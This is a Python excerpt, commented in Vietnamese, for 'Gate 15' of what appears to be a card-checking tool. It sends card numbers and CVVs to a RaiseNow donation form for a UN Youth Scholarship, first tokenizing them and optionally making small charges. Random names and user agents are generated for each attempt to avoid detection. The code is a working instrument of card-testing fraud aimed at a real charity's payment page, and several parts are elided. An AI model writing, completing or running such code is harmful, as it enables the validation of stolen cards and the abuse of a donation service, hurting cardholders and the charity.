...
# --- LOGIC CHÍNH CỦA GATE 15 ---

def check_card_gate15(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate15_mode, get_charge_value_func, custom_charge_amount=None):
    """
    Logic for Gate 15 - Dựa trên formId và payload bạn cung cấp.
    """
    gate15_mode = get_gate15_mode()
    
    try:
        # --- Tạo dữ liệu ngẫu nhiên với yêu cầu mới ---
        user_agent = random_user_agent()
        # Yêu cầu mới: random tên từ 10 đến 35 ký tự
        first_name = generate_random_string(random.randint(10, 35))
        last_name = generate_random_string(random.randint(10, 35))
        ...
        tokenize_payload = {
            "mode": "TOKENIZE",
            "formId": "250809064524398808", # formId bạn cung cấp
            "cardNumber": cc,
            "cvv": cvv,
            "paymentMethod": "ECA",
        ...
        base_payload = {
            ...
            "raisenow_parameters": {
                ...
                "solution": {
                    "uuid": "71495e3c-bfd6-4457-8822-b1998160b425",
                    "name": "UN Youth Scholarship",
                    "type": "donate"
                },
                "product": {
                    "name": "tamaro",
                    "source_url": "https://donate.raisenow.io/tqvcj?lng=en",
                    "uuid": "self-service",
                    "version": "2.16.0"
                },
                "integration": {
            ...
            "return_url": "https://donate.raisenow.io/tqvcj?lng=en&rnw-view=payment_result"
        }

        # --- CHẾ ĐỘ CHARGE ---
        if gate15_mode == 'charge':
            charge_value = get_charge_value_func('15', custom_charge_amount)
        ...
        logger.error(f"Unknown error in Gate 15 for line '{line}': {e}", exc_info=True)
        return 'error', line, f"Gate 15 System Error: {e}", bin_info
